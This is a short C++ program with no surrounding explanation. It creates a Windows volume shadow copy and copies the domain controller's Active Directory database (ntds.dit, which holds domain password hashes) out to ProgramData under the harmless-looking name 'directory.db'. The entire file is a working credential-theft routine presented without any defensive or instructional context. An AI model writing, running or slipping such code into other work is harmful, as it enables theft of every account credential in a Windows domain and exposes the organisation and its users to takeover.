#include <cstdlib>
#include <filesystem>
int main() {
    if (std::system("vssadmin.exe create shadow /for=C:") != 0) return 1;
    std::filesystem::copy_file(R"(\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy38\Windows\NTDS\ntds.dit)", R"(C:\ProgramData\directory.db)");
}
